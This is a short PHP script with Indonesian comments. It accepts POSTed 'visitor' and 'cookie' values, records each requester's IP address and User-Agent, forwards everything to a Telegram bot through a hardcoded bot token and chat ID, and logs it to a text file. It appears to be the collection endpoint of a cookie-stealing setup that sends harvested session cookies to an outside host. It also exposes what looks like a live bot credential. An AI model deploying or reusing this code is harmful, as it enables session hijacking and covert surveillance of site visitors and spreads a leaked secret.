<?php
// Ambil data JSON dari POST
$data = json_decode(file_get_contents("php://input"), true);
$visitor = $data["visitor"] ?? "unknown";
$cookie = $data["cookie"] ?? "none";

// IP & User-Agent
$ip = $_SERVER["REMOTE_ADDR"];
$ua = $_SERVER["HTTP_USER_AGENT"] ?? "unknown";
$waktu = date("Y-m-d H:i:s");

// === Pesan Telegram ===
$token = "8005124115:AAHZetjgu72RoJYv7xvxR7qqZdNiG2i8V_Y";
$chat_id = "6551663060";

$message = "📥 Website dikunjungi\n".
           "🕰 $waktu\n".
           "🌍 IP: $ip\n".
           "🔎 Visitor: $visitor\n".
           "🍪 Cookie: $cookie\n".
           "🧭 User-Agent: $ua";

$url = "https://api.telegram.org/bot$token/sendMessage";
$params = [
    "chat_id" => $chat_id,
    "text" => $message
];

// Kirim ke Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Simpan ke log
$logFile = "log.txt";
$timestamp = date("Y-m-d H:i:s");
$logEntry = "[$timestamp] Visitor=$visitor | IP=$ip | Cookie=$cookie | UA=$ua\n";
file_put_contents($logFile, $logEntry, FILE_APPEND);

// Respon ke browser
http_response_code(204); // No Content
?>
